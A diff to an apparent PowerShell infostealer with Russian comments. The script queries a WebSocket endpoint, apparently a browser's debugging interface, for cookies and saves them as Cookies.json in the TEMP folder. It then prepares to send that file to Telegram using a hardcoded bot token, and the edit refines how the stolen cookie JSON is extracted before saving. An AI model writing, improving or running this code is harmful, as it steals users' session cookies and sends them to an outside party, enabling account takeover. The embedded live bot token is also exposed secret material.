@@ -120,9 +120,12 @@ if ($url_capture[0].Length -ge 2) {
     $response = SendReceiveWebSocketMessage -WebSocketUrl $url_capture -Message $Message
 }
 
-# Сохраняем ответ в файл Cookies.json
+# Извлекаем только JSON-часть из ответа
+$jsonResponse = $response | ConvertFrom-Json | Select-Object -ExpandProperty result
+
+# Сохраняем JSON в файл
 $tempFilePath = "$env:TEMP\Cookies.json"
-$response | Out-File -FilePath $tempFilePath -Encoding UTF8
+$jsonResponse | ConvertTo-Json -Depth 10 | Out-File -FilePath $tempFilePath -Encoding UTF8
 
 # Отправка файла в Telegram
 $botToken = "7677386741:AAFrg5fM7pBPcGeljsPI9BxyHAxXsBzoWl8"  # Замените на ваш токен бота
